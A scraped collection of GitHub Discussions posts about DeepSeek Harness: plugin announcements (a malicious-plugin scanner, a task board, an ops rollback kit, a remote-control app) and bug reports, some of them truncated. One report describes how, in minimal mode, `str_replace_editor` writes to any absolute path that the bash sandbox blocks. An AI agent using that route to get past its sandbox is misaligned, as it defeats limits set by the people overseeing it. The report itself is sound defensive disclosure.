- **in-DSH 工具** `plugin_scan`（装进 dsh 后 agent 能扫任意插件目录）。

**边界说清楚**：静态分析不等于安全保证（Rice 定理，不可判定），任何宣称"100% 拦截投毒"的工具都不可信。这是纵深防御第一道防线，真正的边界是 dsh 沙箱——未验证插件永远别开 `danger-full-access`。

Repo: https://github.com/zoahdev/dsh-poison-guard · 10 tests + CI smoke（真实跑一个混淆恶意插件，判定 MALICIOUS 退出码 1）。

discussions.title: DSH Task Board：面向 Agent 执行与人工审核的任务面板
discussions.body:
#dsh-plugin

# DSH Task Board：面向 Agent 执行与人工审核的任务面板

`DSH Task Board` 为 DeepSeek Harness Web 提供持久化任务看板，把“创建任务、交给 Agent、人工审核、反馈重试、完成归档”组织成一条可视化工作流。

目前提供两种交付方式：

1. **独立社区插件包**：现在即可通过 GitHub 安装，适合希望在已发布 DSH 上直接体验的用户。
2. **官方内置候选**：遵循当前 DSH 仓库架构的精简实现，准备随 DSH Web 一起发布。

## 独立社区插件包

```sh
npx @deepseek-ai/dsh plugin --profile web add github:scwlkq/dsh-task-board
npx @deepseek-ai/dsh web
```

打开终端输出的本地地址，在侧边栏进入“任务面板”。浏览、创建和编辑任务不需要模型凭据；只有实际启动 Agent 执行时才需要配置模型凭据。

- GitHub：https://github.com/scwlkq/dsh-task-board
- Release：https://github.com/scwlkq/dsh-task-board/releases/tag/v0.1.0

## 官方内置候选：精简 MVP

内置候选经过一轮完整精简，只保留任务面板的核心能力：

- 五态看板：初始化、执行中、待审核、已完成、失败。
- 创建、编辑、删除、搜索和同状态列内拖拽排序。
- 启动、停止、通过、驳回、失败重试和重新打开。
- 精简的执行轮次摘要，以及到关联 Harness Session 的跳转。
- Storage Domain 持久化、任务/看板版本控制、冲突回收和事件缺口刷新。
- Web 设置页只显示一个 `task-board` Loader 条目。

为降低维护成本，内置候选删除了附件、follow-up、Preset/Workspace 选择器、列表模式和自定义日志弹窗；完整模型输出、工具活动和对话历史统一回到关联 Session 查看。

![DSH Task Board 完整演示](https://github.com/scwlkq/deepseek-harness/blob/task-board-pr-assets/task-board-demo.gif?raw=true)

![DSH Task Board 五态总览](https://github.com/scwlkq/deepseek-harness/blob/task-board-pr-assets/task-board-demo.png?raw=true)

discussions.title: One-click escape hatch: how I un-bricked my dsh twice (dsh-ops)
discussions.body:
# One-click escape hatch: how I un-bricked my dsh twice, and the ops kit it produced

> **TL;DR** — [dsh-ops](https://github.com/MiraculousGarfield/dsh-ops): a standalone PowerShell ops kit (zero tokens, zero AI) with a **smart rollback** that restores config snapshots newest-first, restarting + health-checking each one until a green state is found. It exists because dsh cannot diagnose itself when it's broken.

## The backstory (two incidents, two days)

I've been playing with dsh since it launched two days ago and managed to break it **twice** — both times while letting an AI agent fiddle with the profile:

1. **Duplicate core packages** — an agent ran a package install in the profile, which pulled in duplicated `@deepseek-ai/dsh-*` packages. Result: every tool in every session crashed in ~1 ms. dsh couldn't diagnose itself because the tools that would diagnose it *were* the things crashing.
2. **Deleted a registered bundle** — an agent "cleaned up" a package directory whose bundle line still existed in `package.json`. Result: the service refused to boot (`cannot resolve profile bundle`). Same trap: you can't ask dsh to fix dsh when dsh won't start.

Both times the only way out was a **standalone script that doesn't depend on dsh at all** — plain PowerShell, 0 tokens, no AI.

## What the kit does

| Piece | What it does |
|---|---|
| `check-health.ps1` | 8 checks (port, HTTP, boot roster, duplicate row ids, duplicated core packages, snapshot discipline, static lint). Every green run **auto-refreshes the known-good baseline** snapshot. |
| `watch-config.ps1` | Auto-snapshots the profile config on every change (keeps 20), so every intermediate state is recoverable — not just the last green one. |
| `fix-service.ps1` / `fix-service.cmd` | **The escape hatch**: restores snapshots newest-first, restarting + health-checking each one, stopping at the first healthy state. It preserves as much recent work as possible — it only falls back further when a newer snapshot fails the check. Saves the current (broken) state to `pre-fix-*` before touching anything. |

The three-tier snapshot design:

```
auto-<stamp>        ← watch-config, on every config change (keeps 20)
known-good-auto     ← check-health, refreshed on every all-green run
known-good-<date>   ← manual milestones (backup-config.ps1 -Name ...)
```

## Why "outside dsh" matters

A host-level dsh failure takes down **every** session — including the agent you'd ask for help. That's why the kit is deliberately standalone: double-click `fix-service.cmd`, it walks back through snapshots until the service comes up green, then restarts and verifies. No dsh required. (The desktop-app watchdog I use also surfaces it as a dialog after repeated failed restarts, so the escape hatch is one click away when the UI is dead.)

## Install

```powershell
git clone https://github.com/MiraculousGarfield/dsh-ops.git
# optional: auto-snapshot on logon (zero-window VBS)
powershell -NoProfile -ExecutionPolicy Bypass -File install.ps1
```

Windows / PowerShell 5.1+. There's also a companion browser plugin — a sidebar "health check" button that runs the same checks via a plain HTTP route independent of the tool registry: [dsh-ops-health](https://github.com/MiraculousGarfield/dsh-ops-health) (submitted to the awesome list, PR #727).

Hope this helps someone avoid the "dsh won't boot and dsh can't tell me why" spiral. Feedback welcome!

discussions.title: 启动报错 duplicate loader entry id: agent-presets，疑似多插件冲突（v0.1.0-rc.6 / Windows）
discussions.body:
### 问题描述

在执行 `dsh web` 或 `dsh --profile web` 时，遇到 `duplicate loader entry id: agent-presets` 错误，导致程序无法启动。

**关键特征**：我是在一次性安装了约 20 个社区插件后，**首次启动**时就立即触发该错误，而非渐进式安装后出现。这暗示 `cordis-plugin-loader` 在加载批量插件时，无法处理多个插件或内置预设对 `agent-presets` 的重复引用。

---

### 复现环境

- **操作系统**：Windows 11
- **Node.js 版本**：v24.15.0
- **DSH 版本**：0.1.0-rc.6（全局安装）
- **Profile**：web
- **安装方式**：通过 `dsh plugin --profile web add` 一次性添加 20 个插件（清单见附件）

---

3. 确认无用户级配置文件（`.dshrc`、`dsh.config.*` 均不存在）；
4. 卸载重装 `@deepseek-ai/dsh` 后，再次安装同样插件，问题依旧复现。

---

### 完整错误日志


I built an open-source plugin for DeepSeek Harness: dsh-ci-co-pilot — a GitHub CI co-pilot that reviews PRs, fixes failing CI, triages issues and ships releases.

8 tools covering the whole dev loop:

- gh_review_pr — pull a PR with files, diff, reviews and CI status
- gh_submit_review — approve / request changes / comment, with inline diff comments
- gh_fix_ci — locate failing checks, annotations and log tails
- gh_rerun_ci — rerun a workflow run (failed jobs or all)
- gh_triage_issues — list issues with age / staleness / label signals
- gh_update_issue — label, assign, comment, milestone, close/reopen
- gh_release_notes — grouped release notes from merged PRs
- gh_create_release — publish release notes as a GitHub release (creates the tag)

Zero-build plain ESM JavaScript, installs from npm or GitHub, 42 tests green, MIT. Also pending in the community index (dsh-index PR #36).

Repo: https://github.com/temotee2103/dsh-ci-co-pilot

discussions.title: dsh-quicksight: 双层识图插件 - 本地图片识别(离线 OCR) + 模型识别(视觉模型) | Two-tier image recognition: local OCR + vision model
discussions.body:
## 简介 / What

dsh-quicksight 为纯文本模型（DeepSeek-V4-Flash/Pro 等）提供**双层图片识别**能力，一个 `quicksight_ocr` 工具搞定：

**① 本地图片识别（Local OCR，离线优先）**
- Tier-1 快速本地 OCR：RapidOCR / PP-OCR / ONNX Runtime，CPU 约 2-3 秒，中英文准确，**完全离线、图片不上传、零 API 成本**。
- 基于开源项目 [RapidOCR (RapidAI)](https://github.com/RapidAI/RapidOCR) 与 [PaddleOCR/PP-OCR (PaddlePaddle)](https://github.com/PaddlePaddle/PaddleOCR)。

**② 模型识别（Vision Model，智能兜底）**
- Tier-2 视觉模型：OCR 不足（空/过短/乱码）或需要视觉理解（布局/颜色/图表/照片/整体分析）时，经 [modlens (liustack)](https://github.com/liustack/modlens) 调用任意已配置视觉引擎（Nvidia NIM / Gemini / 任意 OpenAI 兼容端点），约 20 秒返回结构化证据（summary/OCR/版面/语义/不确定性）。

> 致谢说明：本项目不包含上述开源项目代码，仅按各自协议复用调用——本地识别引擎为 RapidOCR/PP-OCR，视觉桥接为 modlens，上游视觉引擎由用户自选配置。

## Highlights

- **零依赖**（Node 内置 API）、**不监听端口**、无 Web 路由。
- **仓库无任何凭据**——key 只存在本机 `~/.modlens/config.json`。
- 全路径可配置（`ocrPython`/`modlensCli`/环境变量），适配任意 OpenAI 兼容视觉端点。
- v0.1.1：修复空 `dsh.client` 声明导致的启动崩溃，补齐工具 output schema。

## Install

```sh
dsh plugin --profile web add dsh-quicksight
# Tier-1:  python -m venv ~/.dsh/tools/ocr-venv && pip install rapidocr_onnxruntime
# Tier-2:  安装 @liustack/modlens 并在 ~/.modlens/config.json 配置视觉引擎
```

Repo: https://github.com/Isanti2016/dsh-quicksight （README 含完整安装/配置/本地目录/端口说明）

欢迎使用、反馈与 PR！

discussions.title: minimal 模式持久 bash 执行 cd 后工作区认知漂移：模型无法自愈，需手动告知 cwd
discussions.body:
### 现象

在 **minimal（极简）模式**下，模型触发在持久 bash 中 `cd` 出工作区（或自发探索到别的目录）后，会出现一组互相矛盾的行为，且模型无法自行恢复：

1. **写权限与位置认知错位**：bash 内写文件被沙箱拒绝（`[sandbox: file access denied under workspace-write mode]`），但 minimal 的系统提示**不包含工作区绝对路径**，模型无法判断"为什么被拒、该往哪写"。实测中需要用户手动停止并告知工作区目录才能恢复。
2. **相对路径基准分裂**：bash 命令内的相对路径按 **shell 当前目录**解析；`write`/`edit`/`read` 工具的 `file_path` 按 **session cwd**（不可变）解析。`cd` 之后两者脱节，同一相对路径会落到两个不同位置。
3. **工具间不对称**：bash 受沙箱约束（写边界 = session cwd），而 `str_replace_editor` 走 entry-local realm 内的裸 `fs-local`（`sandboxMode` 为 undefined），绝对路径**任何位置都能写**。

### 复现步骤

1. Web GUI 新建会话，选择 **minimal 模式**。
2. 让模型在持久 bash 中执行 `cd /some/other/dir`（持久 shell 状态跨调用保留）。
3. 在 bash 中 `touch f`（目标在工作区外）→ 沙箱拒绝；用 `str_replace_editor` 写同一绝对路径 → 成功。
4. 模型从系统提示中**无法得知** session cwd（persona 固定句 + `complete: true` + `includeRuntimeContext: false`），陷入无法自愈状态，直到用户告知工作区路径。

### 根因分析

这是三个**各自成立的设计**组合出的缺口，而非单点 bug：

| 机制 | 出处 | 状态 |
|---|---|---|
| 沙箱写边界绑定**不可变** `session.header.cwd`（`workspaceRoot = session?.header.cwd ?? fallback`） | `packages/sandbox/sandbox-policy/src/index.ts` L139；`packages/sandbox/sandbox/src/roots.ts` L52-54 | 设计 |
| 持久 bash 的 cwd 是**可变 shell 状态**、跨调用持久 | `packages/shell/tool-bash-persistent/src/index.ts` L233-236；feature note `2026-07-29-persistent-bash-str-replace-editor.md` L13 | 设计 |
| minimal 不注入 cwd（persona 无 `{{cwd}}` + `complete: true` + `includeRuntimeContext: false`） | `apps/cli/config/agent-presets/minimal/agent.cordis.yml`；`packages/preset/persona/src/index.ts` L41-44 | 设计 |
| 相对路径基准分裂（bash 按 shell 位置 vs fs 工具按 session cwd） | `packages/fs/tool-fs/src/session-cwd.ts` L36-45、`write.ts` L108 | **未登记的缺口** |
| 无"shell 位置偏离 workspaceRoot"的检测/提示/重置；唯一回工作区路径是 `SHELL_RESET_MESSAGE`（仅 timeout/abort/shell 退出触发，正常 `cd` 不触发） | `tool-bash-persistent/src/index.ts` L17 | **未登记的缺口** |
| denial marker 不含工作区路径（`[sandbox: file access denied under workspace-write mode]`），模型需自行关联系统提示 | `packages/sandbox/sandbox/src/escalation.ts` L72/L85 | **未登记的缺口** |

补充：`packages/shell/tool-bash-persistent/README.md` 的 Known Limitations（L46-50）只登记了 PTY 依赖、exit/timeout 丢状态、环境事实归部署——**未覆盖本组合后果**。

### 影响范围

- **minimal**：结构性无法自愈（系统不注入 cwd + 持久状态粘滞 + 无 workdir 参数），用户必须手动干预。
- **standard / code / cordis**：以较轻形式存在（一次性 bash + `workdir` 参数 + persona 含 `{{cwd}}`），模型有纠错素材，但长对话漂移时同样可能触发，denial marker 不含路径的问题一致。

### 候选修复（供讨论）

minimal模式有意为之，还是设计缺陷？

工作区+沙箱隔离是否应该是一等公民？

discussions.title: DSH | dsh-anchored-subagent | NO more "Let me…" — DeepSeek at full HP for main & subagents. Every penny buys full performance, with all tools set.
discussions.body:

**真机 E2E 证据：**

discussions.title: [Bug] booting a profile without an application bundle hangs with zero output
discussions.body:
**Bug: booting a profile without an application bundle hangs forever with zero output.**

**Environment**
- @deepseek-ai/dsh 0.1.0-rc.6 (npm), macOS, Node v26.4.0

**Repro**
1. Follow the official publish tutorial: install a local plugin into a fresh profile:
   `dsh plugin --profile report add ./some-local-plugin`
   → profiles/report bundles = [@deepseek-ai/dsh-base, dsh-report-studio] (no app bundle)
2. Boot it:
   `dsh --profile report "hello"`

**Actual**: no output at all; the process hangs indefinitely (killed after 30s in my test).

**Expected**: a fast, explicit failure — something like "profile 'report' has no application bundle (web / headless / tui); add one with dsh plugin --profile report add <app bundle>".

**Impact**: this is the default end-state of the official publish.md tutorial. A user who follows it and tries to run their plugin gets a silent hang instead of a diagnosis. The launcher knows the bundle list; it should validate that an app bundle is present before booting.

**Notes**
- `dsh --profile report --dump-config` works fine (composes the tree), so the hang is specifically the boot path with no app to consume the profile.
- Suggestion: validate at launcher level — if no bundle declares an app entry, exit non-zero with the missing-app message above.

discussions.title: [数据安全] storage-sqlite 会接管未版本化的外部 SQLite 数据库
discussions.body:
storage-sqlite 仅检查 PRAGMA user_version。
只要数据库的 user_version 为 0，即使文件中已经存在其他应用的业务表，也会：

- 创建 units 和 unit_globals；
- 创建 Harness Unit 表；
- 把 user_version 改为 Harness 的 Schema Version。

源码位置：

- packages/storage/storage-sqlite/src/schema.ts:77-106
 同仓库的 session-persistence-sqlite 已经实现更严格的数据库所有权检查：
- PRAGMA application_id
- sqlite_schema 中的用户对象数量
- 事务内初始化

参考位置：

- packages/session/session-persistence-sqlite/src/schema.ts:92-153

**问题影响**

- 外部数据库会被 Harness 静默修改。
- 外部应用可能依赖自己的 user_version，被改写后可能拒绝启动或执行错误迁移。
- 如果外部数据库已有同名 units 表但结构不同，Harness 可能在启动阶段失败。
- 当前不会主动删除外部表，但已经越过了数据库所有权边界。
- 后续 Schema 演进可能增加表名冲突和数据完整性风险。

最小复现
保存为 repro-storage-sqlite.ts：
`import { mkdtemp } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { DatabaseSync } from 'node:sqlite'
import {
  Config,
  SqliteStorageBackend,
} from '@deepseek-ai/dsh-storage-sqlite'

const root = await mkdtemp(join(tmpdir(), 'dsh-storage-foreign-'))
const path = join(root, 'foreign.db')

const foreign = new DatabaseSync(path)
foreign.exec(`
  CREATE TABLE invoices (
    id INTEGER PRIMARY KEY,
    total INTEGER NOT NULL
  );
  INSERT INTO invoices(total) VALUES (100);
`)
foreign.close()

const backend = new SqliteStorageBackend(new Config({ path }))
const unit = await backend.kv.open({
  name: 'specimen',
  version: 1,
  tables: ['records'],
  hasGlobal: true,
})
await unit.close()
await backend.close()

const check = new DatabaseSync(path)

console.log(
  'user_version:',
  check.prepare('PRAGMA user_version').get(),
)

console.log(
  'tables:',
  check.prepare(`
    SELECT name
    FROM sqlite_schema
    WHERE type = 'table'
    ORDER BY name
  `).all(),
)

check.close()`

运行：
pnpm exec tsx repro-storage-sqlite.ts

可以观察到：

- user_version 从 0 变为 Harness 版本；
- 外部 invoices 表仍存在；
- Harness 增加了 units、unit_globals 和 Unit 表。

**可选修复方案**
**方案 A：引入 application_id 和对象检查，推荐**
在一个事务内处理：
读取 application_id、user_version 和非 sqlite_* 用户对象数量。
空数据库允许初始化。
application_id 与 Harness 不匹配时拒绝。
application_id=0 但已有用户对象时拒绝。
初始化完成后同时写入 application_id 和 user_version。
还需要处理现有 Harness 数据库：
如果 user_version 已是当前版本；
且现有表结构与 Harness v1 精确匹配；
可在事务内补写 application_id；
无法证明所有权时必须拒绝。

**方案 B：只检查是否存在非 Harness 表**
实现较简单，但不能可靠区分旧 Harness 数据库和外部数据库，也没有稳定所有权标识。

**方案 C：要求数据库文件必须不存在**
最安全但兼容性太差，会阻止正常重启和持久化使用。
**推荐方案**
推荐方案 A，并尽量复用 session-persistence-sqlite 的所有权检查模式，减少同仓库中两套 SQLite 策略继续漂移。
验收标准

- 空数据库可以初始化。
- 带不同 application_id 的数据库必须拒绝。
- application_id=0 且包含任意外部表、索引、触发器或视图时必须拒绝。
- 现有 Harness v1 数据库能够经过严格结构验证后迁移。
- 初始化任一步失败时，数据库不得留下部分表或版本号。
- 错误中应明确包含目标路径和拒绝原因。

如果维护者认可，我愿意按方案 A 提交 PR，复用现有 Session SQLite 的所有权检查设计，并补充空库、外部数据库、旧 Harness 数据库和事务回滚测试。

discussions.title: [Bug] ask_user_question never shows a dialog in the web GUI; emits ASK_ABORTED instead of showing/answering
discussions.body:
<!-- Filed from a live DSH web session (dsh 0.1.0-rc.6, web GUI). GitHub Issues are disabled on this repo, so this is posted as a Discussion (General). -->

# `ask_user_question` never presents a question dialog in the web GUI and always surfaces as `ASK_ABORTED` after a user cancel

## Environment

- **DSH version:** `0.1.0-rc.6` (`deepseek-ai/deepseek-harness`)
- **Mode:** Web GUI (`dsh web --trusted-host ...`, `http://127.0.0.1:3080`)
- **Profile:** `@deepseek-ai/dsh-base` + `@deepseek-ai/dsh-web-app` (full web bundle; both `dsh-client-ui-user-questions` and `dsh-client-ui-tool` are loaded)
- **OS:** Linux
- **LLM provider:** `opencode-go` / `deepseek-v4-flash`

## Repro steps

1. Start the DSH web GUI and open the main session (a "parent"/root agent whose session is the currently-open conversation window).
2. From that agent, call the `ask_user_question` tool with one or more questions.
3. Observe: no question dialog / composer takeover ever appears in the GUI.
4. Wait (the agent is now blocked, because the tool call awaits a human answer). Then press **Stop / cancel** (or otherwise trigger a session cancel) in the GUI.
5. The tool result that comes back is `Error: ask_user_question was aborted before the user answered` with code `ASK_ABORTED`, and the agent turn ends with `turn/end` reason `{"kind":"aborted","reason":{"kind":"user"}}`.

We reproduced exactly two consecutive occurrences this way (single main GUI session):

| tool call | turn/step | blocked for | result |
|---|---|---|---|
| `call_00_sU7g0WTbB4DQqkHXUjpH8113` | turn 1 step 22 | ~76.6 s | `ASK_ABORTED` |
| `call_00_8OWrNO3nT9WDlAcJTbV24337` | turn 6 step 10 | ~202.2 s | `ASK_ABORTED` |

No `AskUserQuestion` dialog was ever shown ("show questions cho anh trả lời" — showing the questions to the user — never worked).

## Observed vs expected behavior

**Observed:** The `ask_user_question` tool call blocks the agent for tens-to-hundreds of seconds with no visible question dialog. The only exit is an explicit user-level cancel, and that cancel surfaces as `ASK_ABORTED` (`Error: ask_user_question was aborted before the user answered`) instead of a graceful cancel/answer flow. The agent turn then reports `{"kind":"aborted","reason":{"kind":"user"}}`.

**Expected:** When an agent calls `ask_user_question` in the web GUI, a question dialog / composer takeover should be presented immediately in the conversation, the human should be able to answer (or explicitly cancel), and the tool should resolve with the answer (`answered`) or with an explicit user-cancel error (`ASK_CANCELLED`, message `the user cancelled ask_user_question`). The tool should not block silently and should never present the misleading "aborted before the user answered" error for a user-initiated stop on a never-shown dialog.

## Root-cause analysis

### 1. The error text/code is produced by an aborted request signal, and in the field it is NOT pre-aborted

There are exactly two sites that raise the identical message/code:

- `@deepseek-ai/dsh-user-questions/lib/index.js:57` — in `UserQuestionService.ask()`, the first line after the guard: `if (request.signal?.aborted) throw new UserQuestionError("ask_user_question was aborted before the user answered", "ASK_ABORTED")`.
- `@deepseek-ai/dsh-host-apiproxy/lib/index.js:1926-1928` — in the web user-questions provider, the `onAbort` listener attached to `request.signal`: `reject(new UserQuestionError("ask_user_question was aborted before the user answered", "ASK_ABORTED"))` after `claimQuestion(pending, "cancelled")`.

The session-log timing (76 s, 202 s of blocking before the error) proves the signal was **not** already aborted when the tool dispatched; the abort arrived later via the signal’s `abort` event, i.e. the host-side `onAbort` at `dsh-host-apiproxy/lib/index.js:1926-1928` is the actual failing path.

### 2. Where the tool’s signal comes from

- `@deepseek-ai/dsh-tool-ask-user/lib/index.js:96-111` — `execute()` calls `ctx.userQuestions.ask({ ... , signal: exec.signal })` and awaits the result.
- `@deepseek-ai/dsh-tools/lib/index.js:3158-3183` (`dispatchToolBody`) — in the normal loop case `fuseToolSignals(state.callerSignal, wrapperSignal)` returns the caller signal itself (`dsh-tools/lib/index.js:3496-3498`), so `exec.signal` handed to the tool **is** the agent phase abort signal.
- `@deepseek-ai/dsh-agent-loop/lib/index.js:117-144` (`executeToolCalls`) — builds `exec.signal` from the per-turn `signal` and passes it to the scheduler; `@deepseek-ai/dsh-agent-loop/lib/index.js:609`/`:495`/`:519` resolves that signal from `this.phase.abort.signal`.

So `ask_user_question`’s pending promise is scoped to the calling agent’s current-turn `AbortController`. The tool blocks the whole loop until the human answers or the turn is aborted.

### 3. The wait itself blocks the agent turn and has no deadline

- `@deepseek-ai/dsh-agent-loop/lib/index.js:662` — `executeToolCalls(...)` is awaited inline inside `step()`; `runGroup` awaits the dispatched promise (`dsh-agent-loop/lib/index.js:197-208`, `:243-251`), so a pending `ask_user_question` suspends the entire agent turn. No inactivity timeout is attached to the request (we found no timer/timeout around the pending question; the only exits are an explicit answer RPC, an explicit client cancel, or the phase signal aborting).

### 4. The host side is healthy: pending question is created and broadcast

- `@deepseek-ai/dsh-host-apiproxy/lib/index.js:1913-1943` — `ctx.userQuestions.registerProvider({ ask(request) { ... } })` creates a `pending` entry (`rpcId`, `sessionId = request.agent.id`), stores it in `pendingQuestions`, attaches `onAbort` to `request.signal` (line 1932), and pushes a `question/requested` envelope to every mux client (`muxQueues`, line 1941).
- Host-side `respond` resolves answers/cancels via `pendingQuestions.get(message.rpcId)` (`dsh-host-apiproxy/lib/index.js:3816-3865`): an explicit client **cancel** yields `ASK_CANCELLED` (`:3841-3842`), an **answer** yields `answered` (`:3862-3863`). Neither ever fired in the reproduction — **zero `ASK_CANCELLED` tool results** — confirming the dialog was never present/answerable.
- Session log confirms the provider was registered and the caller was live (no `NO_PROVIDER`, `CALLER_NOT_LIVE`, or `DELEGATED_CALLER` errors).

### 5. The observed abort is a user-level cancel propagating through the signal

- `@deepseek-ai/dsh-host-apiproxy/lib/index.js:2950-2960` — the `sessions.cancel` RPC calls `agent.cancel({ kind: "user" }, { keepInbox: true })`.
- `@deepseek-ai/dsh-agent-loop/lib/index.js:405-411` — `cancel()` aborts the current-phase `AbortController` (`this.phase.abort.abort(cause)`), which fires the `abort` event on the very signal passed to the pending `ask_user_question`, triggering `onAbort` → `ASK_ABORTED`.
- The agent turn then records `turn/end` `{"kind":"aborted","reason":{"kind":"user"}}` (`dsh-agent-loop/lib/index.js:575-579`), which is exactly what we saw in the session log.

Important: a normal user **send**/prompt while the tool is blocked does **not** cancel — `sessions.prompt` calls `agent.followup`/`agent.steer` (`dsh-host-apiproxy/lib/index.js:2850-2855`), which merely queues. So the `ASK_ABORTED` we saw implies an explicit `sessions.cancel` (the user’s Stop), even though the user was really trying to *answer/see the question*.

### 6. Why the dialog never appears (the primary defect; most-likely area)

The client-side chain to render the dialog:

- Host broadcasts `question/requested` on the session mux (`dsh-host-apiproxy/lib/index.js:1933-1941`, replay on subscribe `:3617-3624`).
- Client mux dispatch mints the pending wait: `@deepseek-ai/dsh-client-runtime/lib/client.js:7489-7494` (`case "question/requested"` → `this.mint(new PendingWait("question", rpcId, sessionId, payload, respond))`); it is tracked as a per-session pending interaction (`:8331`, `questionInteractionStatus`), buffered when the session is not yet instantiated (`:8333-8344`) and re-applied on open.
- The composer claim renders the dialog: `@deepseek-ai/dsh-client-ui-conversation/lib/client.js:6789` (`pending = useSession(s => s.pending)`), `:6888-6894` (`renderSlotChain("conversation.composer", { interactions: pending, session })`), `@deepseek-ai/dsh-client-ui-user-questions/lib/client.js:650-653` (`selectQuestion` returns the first `interactions.find(i => i.kind === "question")`) and `:665-669` (registers the `QuestionComposer` into the `conversation.composer` slot).
- The answer/cancel travels back through the `respond` carrier (`@deepseek-ai/dsh-client-ui-user-questions/lib/client.js:78-97` `PendingQuestion.answer/cancel` → `this.wait.respond(...)`).

The host provably created and broadcast the pending question (proven by the fact the tool blocked for 76/202 s and only a user cancel could release it), so the missing piece is in the client presentation chain: for this session/UI the `question/requested` either never yields a `{kind:"question"}` pending interaction on the open conversation, or the `conversation.composer` takeover never mounts the `QuestionComposer`. The dialog-vs-cancel semantics only manifest after the user finally cancels and the loop tears down the pending signal.

### Net effect / why it reads as a single confusing bug

`ask_user_question` couples the human-interaction **lifecycle** to the agent-turn **abort signal** with no client-presentation guarantee and no timeout. When the client UI fails to present the question for an in-view session, the agent silently blocks; the eventual user Stop travels through the phase cancel and is misrooted into `ASK_ABORTED` ("aborted before the user answered") instead of a clearly-presentable dialog or `ASK_CANCELLED`. So the bug has two faces:

1. **Presentation:** the web GUI does not show/answer the question (the user-visible failure).
2. **Error semantics:** cancel of an unanswered question is reported as `ASK_ABORTED` with a misleading message rather than `ASK_CANCELLED`, and the agent turn reports `aborted`.

## Suggested fix directions

- **Bind the human-answer lifecycle independent of the turn abort signal where possible.** Give `ask_user_question` a dedicated interaction deadline (e.g. an inactivity/timeout budget) and surface a clear "awaiting the user" state so a silent indefinite block is impossible.
- **Make the abort taxonomy match reality.** When the pending question is released by an explicit user cancel or by the phase being cancelled with a user-level reason, produce `ASK_CANCELLED` ("the user cancelled ask_user_question") rather than `ASK_ABORTED` ("aborted before the user answered"); reserve `ASK_ABORTED` for genuine teardown/disposal.
- **Investigate the client presentation gap** so `question/requested` reliably renders the `QuestionComposer` in an open conversation in the web GUI (verify `dsh-client-runtime` `:7489-7494`/`:8331` interaction tracking and the `conversation.composer` chain in `dsh-client-ui-conversation`/`dsh-client-ui-user-questions`). Add a headless/agent-worker fallback (auto-answer or auto-cancel) for sessions where no interactive client can present the dialog.

## Confidence

**High (≈ 90%)** on the host-side mechanism: `ask_user_question` was pending and unanswered (76 s / 202 s), the dialog was never answered (`0` `ASK_CANCELLED`), and the abort came from a user-level `sessions.cancel` propagating through the agent-turn signal into `ASK_ABORTED` (matches `dsh-host-apiproxy` `:2959` → `dsh-agent-loop` `:410` → `dsh-host-apiproxy` `:1926-1928`).

**Medium (≈ 60-70%)** on the exact client reason the dialog does not render: the host correctly broadcasts `question/requested`, and the full client composer chain exists in the web bundle, but we could not statically pin the precise client failure (presentation vs interaction-tracking vs compose-slot) without browser-level inspection of the running GUI. That client-side sub-cause should be confirmed by a maintainer in the live GUI.

## Supporting file:line anchors

- `packages/interaction/user-questions/src` → built `@deepseek-ai/dsh-user-questions/lib/index.js:56-73` (`ask()`; `:57` sync pre-abort `ASK_ABORTED`)
- `packages/interaction/tool-ask-user/src` → built `@deepseek-ai/dsh-tool-ask-user/lib/index.js:96-111` (`execute` passes `signal: exec.signal`)
- `packages/host/apiproxy/...` → built `@deepseek-ai/dsh-host-apiproxy/lib/index.js:1913-1943` (provider + `onAbort` → `ASK_ABORTED`), `:1903-1912` (`claimQuestion`), `:3816-3865` (`respond`; `:3841-3842` `ASK_CANCELLED`), `:2950-2960` (`sessions.cancel` → `agent.cancel({kind:"user"})`), `:3612-3624` (mux + pending replay)
- `packages/core/agent-loop/...` → built `@deepseek-ai/dsh-agent-loop/lib/index.js:405-411` (`cancel` aborts phase), `:575-579` (`turn/end aborted` reason), `:609`/`:495`/`:519` phase signal, `:662`/`:117-144` (`executeToolCalls` blocks on pending dispatch)
- `packages/core/tools/...` → built `@deepseek-ai/dsh-tools/lib/index.js:3158-3183` (`dispatchToolBody` fuses signal), `:3495-3530` (`fuseToolSignals`)
- `packages/client/runtime/...` → built `@deepseek-ai/dsh-client-runtime/lib/client.js:7489-7499` (mint pending question), `:8331`/`:8333-8344` (track/buffer), `:8276-8292` (`trackPending`/`resolvePending`)
- `packages/client/ui-user-questions/...` → built `@deepseek-ai/dsh-client-ui-user-questions/lib/client.js:650-653` (`selectQuestion`), `:665-669` (composer registration)
- `packages/client/ui-conversation/...` → built `@deepseek-ai/dsh-client-ui-conversation/lib/client.js:6789`, `:6888-6894` (composer slot chain with `interactions`)

## Not confirmed by static reading

- The precise client-side reason the `QuestionComposer` is not presented (needs live browser inspection of the GUI).
- Whether a fresh install reproduces identically, or whether an older/different web build is responsible for the presentation gap.

discussions.title: DSH Remote — control DSH from your Android phone: approvals, questions, goals & 2GB resumable file transfer (LAN/Tailscale)
discussions.body:
**[DSH Remote](https://github.com/Blank-not-black/dsh-Remote)** — a pocket console for DSH: remote sessions, tool approvals, questions, goals, and file transfer, all from your Android phone over LAN or Tailscale.

**Android app (Capacitor hybrid, camera plugin for QR pairing — not a PWA wrapper) + self-healing gateway + DSH plugin, one unit.** Install the plugin and the gateway ships with it, auto-starts with DSH, and the drawer gives you the token and host IP directly.

![Sessions](https://raw.githubusercontent.com/Blank-not-black/dsh-Remote/main/docs/screenshots/mobile-sessions.png)
![Approvals](https://raw.githubusercontent.com/Blank-not-black/dsh-Remote/main/docs/screenshots/mobile-approvals.png)
![Files](https://raw.githubusercontent.com/Blank-not-black/dsh-Remote/main/docs/screenshots/mobile-files.png)
![Gateway admin](https://raw.githubusercontent.com/Blank-not-black/dsh-Remote/main/docs/screenshots/gateway.png)

## What you get

- **Approve tool calls from bed** — allow/deny `bash` requests, answer user questions (pick or type), watch background tasks
- **Sessions on the go** — live conversation, history, goal control (pause/resume/complete/edit/clear), subagent interrupt
- **2 GB file transfer** — direct `/fs/*` endpoints with **resumable uploads** (pause/resume/cancel) + **SHA-256 integrity check** before final write; browse the server filesystem from the phone
- **Bearer-token gateway** — self-healing (auto-restarts with DSH), path-traversal-safe, token rotation with one click, QR pairing
- **Auto server switching** — add LAN + Tailscale addresses, latency test picks the fastest
- **Offline cache** — sessions and viewed history stay browsable when the gateway is unreachable
- **Single-file binaries** for Windows/Linux if you don't want the plugin

## Quick start

```sh
dsh plugin --profile web add dsh-remote-plugin
```

Restart DSH Web, hard-refresh, open **DSH Remote** in the sidebar → scan the QR with the app → done. (APK on the [Releases page](https://github.com/Blank-not-black/dsh-Remote/releases/latest).)

---

